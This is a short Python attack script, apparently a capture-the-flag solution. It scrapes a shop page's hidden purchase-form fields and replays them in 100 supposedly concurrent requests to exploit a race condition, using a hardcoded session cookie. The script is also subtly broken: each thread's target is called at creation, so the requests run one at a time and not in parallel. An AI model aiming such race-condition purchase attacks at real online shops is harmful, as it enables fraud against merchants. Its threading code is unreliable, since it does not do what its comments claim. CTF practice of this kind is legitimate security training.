import requests
import threading
from bs4 import BeautifulSoup

# Target URL
url = "https://eptbox-shop-6.ept.gg/items" 
cookie = {
    "token": "6bd318e2c2ba1307c0088273c29ca03b" #replace with right token
}
num_requests = 100
boundary = "----WebKitFormBoundary1qhWJBRoa05epOoB"

# Function to fetch items from the API
def fetch_items():
    try:
        response = requests.get(url=url, cookies=cookie)
        response.raise_for_status()  # Raise an error for bad responses
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form')     #find the first form (Buy button for Fun product)
        return form.findAll('input') #return all hidden inputs
    except requests.RequestException as e:
        print(f"Error fetching items: {e}")
        return []

# Function to send a single request
def send_request(payload):
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    }
    try:
        response = requests.post(url, data=payload, cookies=cookie, headers=headers)
        print(f"Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

def attack(payload):
    threads = []
    for _ in range(num_requests):   # create threads
        thread = threading.Thread(target=send_request(payload))
        threads.append(thread)
    for thread in threads:          # start threads simultaneously
        thread.start()
    for thread in threads:          # wait for all threads to complete
        thread.join()

def main():
    # Fetch items
    items = fetch_items()
    
    # build payload
    payload = ""
    for input in items:
        payload = payload+f"--{boundary}\r\n"
        payload = payload+f'Content-Disposition: form-data; name="{input.get("name")}"\r\n\r\n'
        payload = payload+f'{input.get("value")}\r\n'
    payload = payload + f"--{boundary}--\r\n"

    #start attack
    attack(payload)

if __name__ == "__main__":
    main()

